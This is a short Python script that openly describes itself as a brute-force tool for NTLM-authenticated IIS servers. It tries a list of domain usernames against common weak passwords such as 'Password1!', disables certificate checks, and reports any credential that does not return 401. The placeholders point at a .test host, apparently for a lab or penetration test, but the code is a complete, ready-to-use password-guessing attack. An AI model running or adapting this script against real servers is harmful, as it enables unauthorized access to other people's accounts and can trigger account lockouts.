#!/usr/bin/python

# Script to perform a brute-force attack against an IIS server protected with NTLM authentication.
# The URL, domain, usernames, and passwords should all be updated.

import requests
from requests_ntlm import HttpNtlmAuth

requests.packages.urllib3.disable_warnings()

domain = "pluto"
usernames = ["rwagner", "advorak", "cgauss", "egalois", "sgermain"]
users = [domain + "\\" + username for username in usernames]
passwords = ["password","password1","Password1","password1!","Password1!"]

url = "https://slepinir.pluto.test"

for user in users:
  for password in passwords:
    try:
      r = requests.get(url, verify=False, auth=HttpNtlmAuth(user,password))
    except Exception as e:
      print ("Error making request for user={0} " \
              "password={1}".format(user,password))
    if r.status_code != 401:
       print ("Status code {0} reported for user={1} " \
               "password={2}".format(r.status_code,user,password))
